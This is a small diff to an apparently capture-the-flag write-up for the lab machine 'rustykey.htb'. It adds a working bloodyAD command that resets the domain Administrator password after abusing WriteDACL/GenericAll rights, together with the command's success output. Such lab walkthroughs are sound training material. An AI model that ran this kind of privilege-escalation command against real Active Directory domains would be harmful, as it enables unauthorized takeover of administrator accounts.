@@ -693,6 +693,13 @@ Also the pwned indicator showing this user is an admin
 With WriteDACL ill just add GenericAll
 
 ```python
+❯❯❯ faketime -f +8h bloodyAD --host dc.rustykey.htb -d rustykey.htb -k set password 'Administrator' 'Password123!'
+[+] Password changed successfully!
+```
+
+Then ill just change the password for the user
+
+```python
 
 ```
 
